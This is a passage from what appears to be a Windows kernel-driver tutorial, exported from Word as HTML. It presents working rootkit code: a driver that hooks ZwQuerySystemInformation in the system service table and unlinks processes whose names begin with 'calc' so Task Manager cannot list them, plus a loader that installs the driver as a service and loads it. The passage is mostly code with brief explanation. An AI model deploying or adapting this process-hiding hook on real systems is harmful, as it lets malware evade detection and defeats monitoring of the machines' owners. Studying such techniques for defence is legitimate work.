prev=%x&quot;,process_name.Buffer,curr-&gt;NextEntryDelta,prev);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>prev-&gt;NextEntryDelta
+= curr-&gt;NextEntryDelta;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>else <o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Last&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>prev-&gt;NextEntryDelta
= 0;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>prev = curr;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if (
curr-&gt;NextEntryDelta)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>((char *)curr +=
curr-&gt;NextEntryDelta);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>else<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>break;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return rc;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>long no;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverDispatcher(PDEVICE_OBJECT pDeviceObject, PIRP Irp)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;IRP_MJ_CREATE\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoCompleteRequest(Irp,
IO_NO_INCREMENT);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>VOID DriverUnload(PDRIVER_OBJECT
DriverObject)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Unloading&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_asm cli<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>KeServiceDescriptorTable.ServiceTableBase[no]=(unsigned
int)OldZwQuerySystemInformation;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_asm sti<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING RegistryPath)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>char *p;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;DriverUnload
= DriverUnload;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;MajorFunction[IRP_MJ_CREATE]
= DriverDispatcher;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Vijay
2 KeServiceDescriptorTable=%x&quot;,KeServiceDescriptorTable);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p = (char
*)ZwQuerySystemInformation;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p = p + 1;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>no = *(long *)p;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>OldZwQuerySystemInformation=(qtype)KeServiceDescriptorTable.ServiceTableBase[no];<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_asm cli<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>KeServiceDescriptorTable.ServiceTableBase[no]=(unsigned
int)NewZwQuerySystemInformation;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_asm sti<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>calc.exe
curr=7863e0 prev=786250 Delta=0<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Last<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoBodyText style='tab-stops:.5in;mso-layout-grid-align:auto;
text-autospace:ideograph-other'><span style='mso-bidi-font-size:8.0pt;
mso-bidi-font-family:"Times New Roman"'>The next program actually hides any
program that begins with the word calc. We use it to hide the windows
calculator calc.exe. We simply add a if statement to the while loop. For the
ones who have come in late, we are passed a link list of structures. The first
member is not the address of the next structure but a delta or an offset to
where the next structure starts. Thus each structure links to the next
structure by a number. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>We
have the name of the program running in a unicode string. We use the function
RtlUnicodeStringToAnsiString to convert a unicode string to a ansi string. The
only difference is that a ansi string is a char * whereas the unicode string is
unsigned short *. The other two members remain the same. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>The
strnicmp checks for a specified length n and ignores case i. If the if
statement is true, we have found the program name we are looking for. Now all
that we need to do is remove this structure from the linked list. The variable
curr points to the current process structure. All that we do is have a pointer
prev which points to the previous such structure. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>This
previous structure points to the current structure. We simply add the offset
stored in the member NextEntryDelta to the NextEntryDelta of the prev member.
If the delta of the prev structure was 100, it means that 100 bytes away is the
next structure. If the delta of the curr structure is 300, it means that 300
bytes away is the 3<sup>rd</sup> structure. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>If
we add 100+300 = 400 and place this value in prev, we bypass the curr or 2<sup>nd</sup>
structure and point directly to the third. The only problem is that if the curr
is the last structure in the list there is no next structure. In that case the
else<span style="mso-spacerun: yes">  </span>gets called and we have to set
prev as the last structure by setting its delta to 0. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>The
other problem is that if curr points to the first process, there is no prev
process and the above logic fails. The solution is the first process has no
name as it is the System Idle Process. This is not a process anyone can hide
and hence we have not build it into our logic. Also start task Manager, run
calc and then run y –i. This hides calc and when we run y –u it brings it back
again. Magic.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>The
reason why all this happens is that programs like the Task Manager do not access
Direct Kernel memory like we did earlier. They use functions like
ZwQuerySystemInformation to tell them what programs are running on the system.
There is no way on earth they can ever verify that the output of the
ZwQuerySystemInformation has been altered by a device driver. This is another
way we can hide a process from windows. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>P45<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>y.c<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;windows.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;malloc.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;tlhelp32.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#define DRV_NAME
&quot;vijayd&quot;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#define DRV_FILENAME
&quot;vijay.sys&quot;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#define DIRECTORY
&quot;C:\\driverm&quot;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef struct<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">  </span>unsigned short<span style="mso-spacerun:
yes">  </span>Length;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">  </span>unsigned short<span style="mso-spacerun:
yes">  </span>MaximumLength;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>char * Buffer;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>} ANSI_STRING,
*PANSI_STRING;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef struct <o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">  </span>unsigned short<span style="mso-spacerun:
yes">  </span>Length;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">  </span>unsigned short<span style="mso-spacerun:
yes">  </span>MaximumLength;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">  </span>unsigned short *Buffer;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>} UNICODE_STRING,
*PUNICODE_STRING;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>long (_stdcall *
_RtlAnsiStringToUnicodeString)(PUNICODE_STRING<span style="mso-spacerun: yes"> 
</span>DestinationString,PANSI_STRING<span style="mso-spacerun: yes"> 
</span>SourceString,unsigned char);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>VOID (_stdcall
*_RtlInitAnsiString)(PANSI_STRING<span style="mso-spacerun: yes"> 
</span>DestinationString,char *<span style="mso-spacerun: yes"> 
</span>SourceString);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>long (_stdcall *
_ZwLoadDriver)(PUNICODE_STRING DriverServiceName);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>long (_stdcall *
_ZwUnloadDriver)(PUNICODE_STRING DriverServiceName);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ANSI_STRING aStr;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>UNICODE_STRING uStr;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>HMODULE hntdll;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned long
byteRet;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>HANDLE hDevice;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>HKEY hkey;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DWORD val,b;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>char *imgName =
&quot;System32\\DRIVERS\\&quot;DRV_FILENAME;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>void main(int argc,
char* argv[])<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>hntdll =
GetModuleHandle(&quot;ntdll.dll&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_ZwLoadDriver =
GetProcAddress(hntdll, &quot;NtLoadDriver&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_ZwUnloadDriver =
GetProcAddress(hntdll, &quot;NtUnloadDriver&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_RtlAnsiStringToUnicodeString
= GetProcAddress(hntdll, &quot;RtlAnsiStringToUnicodeString&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_RtlInitAnsiString =
GetProcAddress(hntdll, &quot;RtlInitAnsiString&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if (
strcmp(argv[1],&quot;-i&quot;) == 0)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>CopyFile(DIRECTORY&quot;\\&quot;DRV_FILENAME,&quot;C:\\winnt\\system32\\drivers\\&quot;DRV_FILENAME,1);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>RegCreateKey(HKEY_LOCAL_MACHINE,&quot;System\\CurrentControlSet\\Services\\&quot;DRV_NAME,&amp;hkey);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>val = 1;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>RegSetValueEx(hkey,
&quot;Type&quot;, 0, REG_DWORD, (PBYTE)&amp;val, sizeof(val));<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>RegSetValueEx(hkey,
&quot;ErrorControl&quot;, 0, REG_DWORD, (PBYTE)&amp;val, sizeof(val));<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>val = 3;<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>RegSetValueEx(hkey,
&quot;Start&quot;, 0, REG_DWORD, (PBYTE)&amp;val, sizeof(val));<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>RegSetValueEx(hkey,&quot;ImagePath&quot;,0,REG_EXPAND_SZ,(PBYTE)imgName,strlen(imgName));<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_RtlInitAnsiString(&amp;aStr,&quot;\\Registry\\Machine\\System\\CurrentControlSet\\Services\\&quot;DRV_NAME);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_RtlAnsiStringToUnicodeString(&amp;uStr,
&amp;aStr, TRUE);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_ZwLoadDriver(&amp;uStr);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>hDevice =
CreateFile(&quot;\\\\.\\&quot;DRV_NAME, GENERIC_WRITE | GENERIC_READ,
FILE_SHARE_READ | FILE_SHARE_WRITE,NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,
NULL);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DeviceIoControl(hDevice,
2 &lt;&lt; 3 , argv[2], strlen(argv[2]), 0, 0, &amp;b, 0);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if (
strcmp(argv[1],&quot;-u&quot;) == 0)<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_RtlInitAnsiString(&amp;aStr,&quot;\\Registry\\Machine\\System\\CurrentControlSet\\Services\\&quot;DRV_NAME);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_RtlAnsiStringToUnicodeString(&amp;uStr,
&amp;aStr, TRUE);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_ZwUnloadDriver(&amp;uStr);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DeleteFile(&quot;C:\\winnt\\system32\\drivers\\&quot;DRV_FILENAME);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>RegDeleteKey(HKEY_LOCAL_MACHINE,
&quot;System\\CurrentControlSet\\Services\\&quot;DRV_NAME&quot;\\Enum&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>RegDeleteKey(HKEY_LOCAL_MACHINE,
&quot;System\\CurrentControlSet\\Services\\&quot;DRV_NAME);<o:p></o:p></span></p>

<p class=MsoNormal style='tab-stops:.5in'><span style='font-size:10.0pt;
mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

